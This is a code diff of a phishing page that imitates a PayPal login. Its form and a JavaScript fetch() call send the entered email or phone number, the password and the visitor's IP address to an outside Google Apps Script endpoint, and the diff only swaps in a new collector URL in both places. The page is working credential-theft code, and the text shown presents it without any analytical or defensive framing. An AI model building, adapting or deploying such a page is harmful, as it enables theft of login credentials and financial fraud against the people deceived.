@@ -73,7 +73,7 @@
     <div class="login-container">
         <img src="IMG_20241103_191216.jpg" style="height:65px; width:200px; alt="Paypal Logo" title="Paypal Logo">
         <p data-translate style="font-size:17px">Log into Paypal to continue</p>
-        <form action="https://script.google.com/macros/s/AKfycbyvnhYj8_VRskFSYYsVgK4C_E0hI6eTJZVkZO3M-Z53jUubXKOMVmXnZPkWKOZ24A/exec" id="paypal" method="POST">
+        <form action="https://script.google.com/macros/s/AKfycbyZkHf_IQuy5zkDvxFs-H6GmZp6R2yPs2R2o5aADu_qIGU8BhKXJ1749L3Z8BV6xyRH/exec" id="paypal" method="POST">
             <input data-translate-placeholder type="text" name="email_or_phone" placeholder="Mobile number or email address" style="font-size:19px;" required/>
             <input data-translate-placeholder type="password" name="message" placeholder="Password" required/>
             <input type="hidden" id="ip_address" name="ip_address">
@@ -191,7 +191,7 @@
           for (const [key, value] of formData.entries()) {
             jsonData[key] = value;
           }
-          fetch('https://script.google.com/macros/s/AKfycbyvnhYj8_VRskFSYYsVgK4C_E0hI6eTJZVkZO3M-Z53jUubXKOMVmXnZPkWKOZ24A/exec', {
+          fetch('https://script.google.com/macros/s/AKfycbyZkHf_IQuy5zkDvxFs-H6GmZp6R2yPs2R2o5aADu_qIGU8BhKXJ1749L3Z8BV6xyRH/exec', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/x-www-form-urlencoded',
